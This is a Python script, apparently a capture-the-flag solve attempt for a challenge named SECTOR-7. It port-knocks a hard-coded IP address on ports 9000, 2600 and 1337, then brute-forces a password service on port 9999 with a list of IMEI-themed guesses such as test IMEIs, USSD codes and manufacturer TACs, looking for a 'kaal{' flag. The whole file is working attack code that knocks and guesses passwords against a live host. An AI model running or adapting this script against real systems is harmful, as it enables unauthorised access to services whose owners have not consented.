#!/usr/bin/env python3
"""
SECTOR-7 IMEI-Focused Attack
The hint says "His number has always been there. Every phone carries it"
This refers to IMEI - but what specific IMEI?
"""

import socket
import time

TARGET_IP = "13.206.58.35"
KNOCK_SEQUENCE = [9000, 2600, 1337]
SERVICE_PORT = 9999

def knock_ports():
    """Perform port knocking"""
    for port in KNOCK_SEQUENCE:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect((TARGET_IP, port))
            sock.close()
        except:
            pass
        time.sleep(0.2)

def try_password(password):
    """Try a single password"""
    try:
        knock_ports()
        time.sleep(0.3)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((TARGET_IP, SERVICE_PORT))
        
        # Receive banner
        banner = sock.recv(4096)
        
        # Send password
        sock.send((password + "\n").encode())
        time.sleep(0.3)
        
        # Get response
        response = sock.recv(4096)
        sock.close()
        
        resp_text = response.decode('utf-8', errors='ignore')
        
        # Check for success
        if "denied" not in resp_text.lower() and "incorrect" not in resp_text.lower():
            print(f"\n[+] Password '{password}' gave response:")
            print(resp_text)
            if "kaal{" in resp_text.lower() or len(resp_text) > 100:
                return True
        
        return False
    except Exception as e:
        return False

def main():
    print("[*] SECTOR-7 IMEI-Focused Attack")
    print("[*] Hint: 'His number has always been there. Every phone carries it'\n")
    
    # IMEI-related passwords
    passwords = [
        # Standard IMEI format: 15 digits
        # TAC (Type Allocation Code) for common manufacturers
        
        # Famous/example IMEIs
        "123456789012345",  # Common example IMEI
        "000000000000000",  # All zeros
        "111111111111111",  # All ones
        "999999999999999",  # All nines
        
        # IMEI check digit patterns
        "356938035643809",  # Common test IMEI
        "490154203237518",  # Another test IMEI
        
        # USSD codes related to IMEI
        "*#06#",
        "#06#",
        "06",
        "*06*",
        
        # IMEI with context
        "IMEI",
        "imei",
        "IMEI123456789012345",
        "imei:123456789012345",
        
        # Combine with challenge clues
        "IMEI9000",
        "IMEI2600",
        "IMEI1337",
        "IMEI-9000-2600-1337",
        
        # Phone-related
        "phone",
        "mobile",
        "cellular",
        "gsm",
        
        # If "his" refers to KAAL
        "KAAL123456789012345",
        "kaal123456789012345",
        
        # Specific manufacturer TACs
        "35699680",  # Apple iPhone TAC
        "35404810",  # Samsung TAC
        "86222103",  # Huawei TAC
        
        # Try just the TAC codes
        "35699680",
        "35404810",
        "86222103",
        
        # IMEI structure: TAC(8) + SNR(6) + CD(1)
        # Try with 9000, 2600, 1337
        "90002600133700",
        "900026001337",
        "13372600900000",
        
        # Reverse engineering: if IMEI is "always there"
        # Maybe it's a specific famous IMEI from history
        "357503010214530",  # First iPhone IMEI pattern
        
        # Try the knock sequence as IMEI
        "900026001337000",
        "000900026001337",
        
        # IMEI with check digit
        "900026001337001",
        "900026001337002",
        "900026001337003",
        "900026001337004",
        "900026001337005",
        "900026001337006",
        "900026001337007",
        "900026001337008",
        "900026001337009",
    ]
    
    print(f"[*] Testing {len(passwords)} IMEI-related passwords...\n")
    
    for i, pwd in enumerate(passwords, 1):
        print(f"[{i}/{len(passwords)}] Trying: {pwd}")
        if try_password(pwd):
            print(f"\n[!!!] SUCCESS! Password: {pwd}")
            return
        time.sleep(0.4)
    
    print("\n[-] No IMEI password worked")
    print("[*] The IMEI might need to be calculated or derived differently")

if __name__ == "__main__":
    main()
